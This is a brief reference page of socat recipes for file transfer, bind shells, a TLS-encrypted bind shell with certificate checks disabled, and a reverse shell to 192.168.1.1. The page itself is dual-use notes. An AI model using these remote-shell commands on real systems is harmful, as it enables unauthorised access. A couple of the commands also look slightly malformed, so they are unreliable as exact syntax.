---
title: "socat"
linkTitle: "socat"
date: 2017-01-05
---

### Transfer

Alice -> Bob

Alice:

```bash
socat TCP4-LISTEN:443,fork file:journald.log
```

* fork: After establishing a connection, handles its channel in a child process
and keeps the parent process attempting to produce more connections.

Bob:

```bash
socat -d -d TCP4:192.168.1.1:443 file:journald.log,create
```

### Bind shell

Alice -> Bob

Alice:

```bash
socat - TCP4:192.168.1.1:1234
```

Bob:

```bash
socat -d -d TCP4-LISTEN:1234 EXEC:/bin/bash
```

For windows:

```bash
socat -d -d TCP4-LISTEN:1234 EXEC:'cmd.exe',pipes
```

### Encrypted bind shell

Alice -> Bob -> Alice

Alice:

```bash
$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
$ cat bind_shell.key bind_shell.crt > bind_shell.pem
$ socat OPENSSL-LISTEN:192.168.1.1:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```

Bob:

```bash
socat - OPENSSL:192.168.1.1:443,verify=0
```

### Reverse shell

Alice -> Bob -> Alice

Alice:

```bash
socat TCP4:192.168.1.1:1234 EXEC:/bin/bash
```

Bob:

```bash
socat - TCP4-LISTEN:1234 STDOUT
```
